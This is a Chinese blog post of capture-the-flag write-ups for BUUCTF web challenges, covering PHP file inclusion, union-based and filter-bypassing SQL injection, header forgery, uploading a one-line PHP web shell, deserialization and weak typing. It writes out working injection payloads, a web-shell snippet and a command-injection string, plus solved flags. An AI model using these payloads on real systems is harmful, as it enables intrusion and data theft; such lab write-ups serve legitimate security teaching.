<p><img src="https://img-blog.csdnimg.cn/d5db8ab9fb004a519fbbe440e4f633db.png" alt="7"><br>我认为这篇文章不错，大家可以<a href="https://blog.csdn.net/vanarrow/article/details/108295481#:~:text=%E5%86%85%E8%81%94%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B0%86%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%86%85%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%89%A7%E8%A1%8C%20%3Fip%3D127.0.0.1%3Bcat%24IFS%249%60ls%60%20%24IFS%E5%9C%A8Linux%E4%B8%8B%E8%A1%A8%E7%A4%BA%E4%B8%BA%E7%A9%BA%E6%A0%BC,%249%E6%98%AF%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Fshell%E8%BF%9B%E7%A8%8B%E7%AC%AC%E4%B9%9D%E4%B8%AA%E5%8F%82%E6%95%B0%E6%8C%81%E6%9C%89%E8%80%85%EF%BC%8C%E5%A7%8B%E7%BB%88%E4%B8%BA%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%24%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%8E%A5%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97%20%E8%BF%99%E9%87%8C%24IFS%249%E6%88%96%24IFS%E5%9E%82%E7%9B%B4%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA%24%E4%B8%8E%7B%7D%E7%B1%BB%E4%BC%BC%EF%BC%8C%E8%B5%B7%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8%201">参考一下</a></p>
<h2 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h2><p><img src="https://img-blog.csdnimg.cn/21b672b9a2514523b89df8ad798a406b.png" alt="1"><br>去源码看看<br><img src="https://img-blog.csdnimg.cn/fb593331da744aa3930c6d89aeab2be7.png" alt="2"><br>有一个php文件,访问一下看看<code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/Archive_room.php</code><br><img src="https://img-blog.csdnimg.cn/9d9847ef896e4a73a697ff0f032e8477.png" alt="2"><br>点开后<br><img src="https://img-blog.csdnimg.cn/f6d7e63800e843c5a194471e7b29604e.png" alt="3"><br>页面跳转太快了，抓包看看<br><img src="https://img-blog.csdnimg.cn/f09067820c274538b236cad427d872b6.png" alt="5"></p>
<p>注释区有一个文件访问看看<br>得到如下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">//flag放在了flag.php里</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() 函数</a><br><a href="https://www.w3school.com.cn/php/func_string_strstr.asp">PHP strstr() 函数</a><br>strstr和stristr都是匹配字符串用的，但是strstr是区分大小写的，stristr是不区分大小写的。</p>
<p>所以例如：<br><code>&lt;?php  show_source(__FILE__);  echo $_GET[&#39;hello&#39;];  $page=$_GET[&#39;page&#39;];  while (strstr($page, &quot;php://&quot;)) &#123;  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);   &#125;    include($page);    ?&gt;</code></p>
<blockquote>
<p>这段php代码，当page参数中有php:&#x2F;&#x2F;字段的时候就会被替换成空，但是是用strstr匹配的，所以写PHP:&#x2F;&#x2F;input再post就不会被替换掉。</p>
</blockquote>
<p>那么就采用php:&#x2F;&#x2F;协议中的php:&#x2F;&#x2F;filter<br><code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code><br>得到</p>
<blockquote>
<p>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNlZDgxOGYtZjM4MS00OWFjLThjNDEtOTMzOTE2ZmVjZGJjfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;<br>解密之后得到flag。</p>
</blockquote>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/ac670dfd41f2450a8d5ca02b5e9d3dc9.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/404c661805b048e39d33a2094a1ca0c7.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8bd81110c54a4d93b1977ffb225654d3.png" alt="3">直接万能密码<br><img src="https://img-blog.csdnimg.cn/d90fecebb74646dcbf7f0067f51afab6.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/f766ec5a93624dcaa587c5b8b7572887.png" alt="5"><br>密码md5解密不解密都不能用，题目既然是LoveSQL，那就开始最基础的操作<br>查看有几列<code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 4%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/aa0456adb9c04bb49d67511f09994f1d.png" alt="5"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/8a28e495e33e4fe3957bbdb7906bcf14.png" alt="6"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,2,3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/760edddc69cb4cb2b42c44d75e69b35b.png" alt="7"><br>在2和3位置注入<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,database(),3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/153c23c6528f42e3a70789972ce64e9a.png" alt="8"><br><strong>爆破表名：</strong><br> <code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/70b3fb676e0b4563b3f2bd70506e1390.png" alt="9"><br><strong>geekuser</strong>和<strong>l0ve1ysq1</strong>，先看第一个，<br><strong>爆破列名：</strong><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;geekuser&#39;%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/c4f226dea1934756b7a81508108a96f4.png" alt="10"><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM geekuser%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/3cb3400a84e147568c891de1ffeddd5a.png" alt="11">不对，看另一个表<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM l0ve1ysq1%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/953a9aa4e16446e8b2013e713a20350b.png" alt="12"></p>
<p>得到flag。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>就是一个页面，看了一遍没啥，看看源码：</p>
<p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>有secret.php文件<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2">需要伪造，开始抓包改包</p>
<p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt="在这里插入图片描述"></p>
<p>继续改<br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br>本地代理开启<br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>文件上传</strong><br><img src="https://img-blog.csdnimg.cn/bcaa47b202f84691a8025030c81de3e1.png" alt="1"><br>一句话木马安排上！<code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[111])&lt;/script&gt;</code>或<code>&lt;?php eval$_POST[111];?&gt;</code>本题中第二个不行，选第一个。他让上传一张图片，那我们就在抓包的时候改一下。</p>
<p><img src="https://img-blog.csdnimg.cn/943f2c97506b44f2a89f2411ca82ea8b.png" alt="3"><br>结果没成功<br><img src="https://img-blog.csdnimg.cn/1d35bc7aa0804e2c8d483798fe1681c5.png" alt="2"><br>在一句话木马内容前面加入<strong>gif89a</strong>，如：gif89a &lt;%eval request(“xx”)%&gt; 然后将木马保存为图片的格式，如xxx.jpg，xx.gif文件头欺骗可以用来绕过简单的waf。</p>
<p><strong>什么是GIF89a?</strong></p>
<blockquote>
<p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/77420aae89a84bcf8f5f4b088d5a2939.png" alt="5"><br>还是不行<br>后来发现是写成shell.phtml可以，<img src="https://img-blog.csdnimg.cn/eae751b2d53548b4a0a8e06cd5532007.png" alt="6"><br>蚁剑连接得到flag<br><img src="https://img-blog.csdnimg.cn/f2813def245f434e82b4e1bf716bab2a.png" alt="7"></p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://img-blog.csdnimg.cn/7c30418f57b942f6b50b6cd9438386cd.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/d1cfa48ceafa4f56b8d51e4c4c218199.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/97419c713baf4031b1bee85bcb3d2c48.png" alt="3"><br>可能是or被过滤了，那就双写绕过<br><img src="https://img-blog.csdnimg.cn/d6d8052077c14610b0e4be63ff5b83f7.png" alt="4"><br>成功！<br><img src="https://img-blog.csdnimg.cn/16958e2ab1af45e1ac30c433bef723af.png" alt="5"><br>经过测试，or,by,union,select,where,from,and都被过滤了，那就都进行双写绕过<br>爆出有哪些位置可以进行输出数据<br><code>1&#39; oorrder by 3#</code><br><em>经测试有3列</em></p>
<p>查看数据库名字<br><code>1&#39; uunionnion selselectect 1,2,database()#</code></p>
<p>爆破表名：<br><code>-1&#39; uunionnion seselectlect 1,2,group_concat(table_name) FFROMROM infoorrmation_schema.tables wherwheree table_schema=database()#</code><br><img src="https://img-blog.csdnimg.cn/d4a24a5c9e66422eaee2a7d97cc3e5ab.png" alt="6"></p>
<p>爆破列名：<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;表名&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p>
<p>爆破数据：<br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM 表名#</code><br>得到flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p>
<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>本题难度不大，主要进行双写绕过，其中or在被过滤时要注意<strong>information</strong>中的<strong>or</strong>也会过滤，所以要写成<strong>infoorrmation</strong></p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>从题目上来看这是一道php的题目，首页显示存在备份网站的习惯<br><img src="https://img-blog.csdnimg.cn/f4e9a9f0e8dc42e8bbc1e56acfa88747.png" alt="1"><br>然后就了解一下常见备份文件有哪些后缀名？</p>
<blockquote>
<p>常见的备份文件后缀名：“.git” 、“.svn”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”</p>
</blockquote>
<p>可以用<strong>dirsearch</strong>扫一下</p>
<blockquote>
<p>使用</p>
</blockquote>
<blockquote>
<p>-u 指定url</p>
</blockquote>
<blockquote>
<p>-e 指定网站语言</p>
</blockquote>
<blockquote>
<p>-w 可以加上自己的字典（带上路径）</p>
</blockquote>
<blockquote>
<p>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
</blockquote>
<p>进入dirsearch目录后</p>
<p>执行.&#x2F;dirsearch.py -u 127.0.0.1 -e php类似的目录</p>
<p>这里就不扫描了，最后扫描到<a href="http://www.zip,在后缀加上他之后保存文件/">www.zip，在后缀加上他之后保存文件</a><br><img src="https://img-blog.csdnimg.cn/d8843158602b47acac1b90a490dcd436.png" alt="2"><br>得到5个文件。</p>
<blockquote>
<p>class.php文件</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，主要意思就是当<strong>username</strong>强相等于<strong>admin</strong>，<strong>password</strong>弱相等于<strong>100</strong>时给出flag，但是需要注意一点的就是程序在执行时，会将<strong>username</strong>赋值为<strong>guest</strong>，这意味着不能得出flag。先放在这里，看看其他文件。</p>
<blockquote>
<p>index.php文件</p>
</blockquote>
<p>其中有一段内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们通过get请求传入select参数，并且值被反序列化了（<strong>unserialize</strong>）</p>
<p>实在不会了，写题步骤请参考<a href="https://zhuanlan.zhihu.com/p/366455343">这位师傅</a></p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化对象参考规则</strong></p>
<blockquote>
<p>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”daye”;}<br>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}<br>变量及对象类型参考<br>a - array         b - boolean<br>d - double         i - integer<br>o - common object     r - reference<br>s - string         C - custom object<br>O - class         N - null<br>R - pointer reference   U - unicode string</p>
</blockquote>
<p><strong>private 声明的字段在序列化时，需要注意：</strong></p>
<blockquote>
<p>   private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。<br>   因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"daye"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 9=7+2  10=8+2  其中2为两个前缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a></p>
<blockquote>
<p>下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 __debugInfo() 。 </p>
</blockquote>
<p><strong>序列化与反序列化简单介绍</strong></p>
<blockquote>
<p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize()</p>
</blockquote>
<blockquote>
<p>反序列化:恢复原先被序列化的变量 函数: unserialize()</p>
</blockquote>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>打开题目后是真的干净，没有一点信息。没有注意到的一点就是题目名称！<strong>backup file</strong>中文意思就是<strong>备份文件</strong>说明存在备份文件。</p>
<blockquote>
<p>网站备份压缩文件<br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
</blockquote>
<p>拿dirsearch扫一下<br><img src="https://img-blog.csdnimg.cn/9acc437c03744836b70d8748bf4d6199.png" alt="1"><br>需要等待一个漫长的时间<img src="https://img-blog.csdnimg.cn/78f243565bdf4940bebebe089d87d9a0.png" alt="2"><br>最后找到这个文件保存下来得到以下内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就是弱类型的问题，<br><img src="https://img-blog.csdnimg.cn/af49efe60a034006a4f3db1994dacea2.png" alt="3"><br>得到flag：<code>flag&#123;d21c38ea-d364-4047-a47c-4527c09a3937&#125; </code></p>
